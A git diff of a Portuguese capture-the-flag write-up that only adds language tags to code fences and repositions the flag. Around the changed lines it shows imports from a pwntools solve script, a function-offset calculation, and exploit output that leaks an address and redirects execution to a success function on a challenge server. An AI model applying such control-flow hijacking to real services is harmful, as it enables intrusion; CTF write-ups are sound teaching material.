@@ -139,7 +139,7 @@ Agora para calcular o deslocamento basta diminuir o andress de uma função pela
 Temos nossa distancia de uma função para outra, `37`, então, teremos que subtrair do andress do `check_king`
 tendo tudo que precisamos, é hora do solve
 
-```
+``` python
 from pwn import *
 import struct
 import time
@@ -174,13 +174,15 @@ print(resp[resp.find('FLAG'):])
 r.close()
 ```
 
-```
+``` c
 [+] Opening connection to 159.203.38.169 on port 5683: Done
 [*] Triggering leak...
 [*] Retrieving address of check_knight...
 [*] Calculating address of success_king...
 [*] Calling success_king...
-`FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`
+FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}
 
 [*] Closed connection to 159.203.38.169 port 5683
 ```
+
+`FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`
